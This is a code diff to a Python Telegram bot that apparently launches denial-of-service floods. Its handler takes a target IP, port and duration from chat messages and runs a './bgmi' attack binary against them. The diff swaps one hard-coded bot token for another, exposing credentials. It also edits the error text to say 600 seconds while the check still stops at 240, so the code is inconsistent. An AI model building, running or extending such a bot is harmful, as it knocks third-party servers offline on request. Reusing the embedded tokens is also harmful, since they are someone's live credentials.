@@ -5,7 +5,7 @@ import subprocess
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7822534251:AAHHHnXk291u0lXQ5syJJXzAVWfkEg0-3uw')
+bot = telebot.TeleBot('8143420181:AAEvswx54ZtQJB64pLN-o8JmdOsmyUTNzvA')
 
 
 
@@ -26,7 +26,7 @@ def handle_bgmi(message):
         port = int(command[2])  # Convert port to integer
         time = int(command[3])  # Convert time to integer
         if time > 240:
-            response = "🔴 𝙀𝙧𝙧𝙤𝙧: 𝙐𝙨𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 240 𝙎𝙚𝙘𝙤𝙣𝙙𝙨"
+            response = "🔴 𝙀𝙧𝙧𝙤𝙧: 𝙐𝙨𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 600 𝙎𝙚𝙘𝙤𝙣𝙙𝙨"
         else:
             start_attack_reply(message, target, port, time)  # Call your function here
             full_command = f"./bgmi {target} {port} {time} 100"
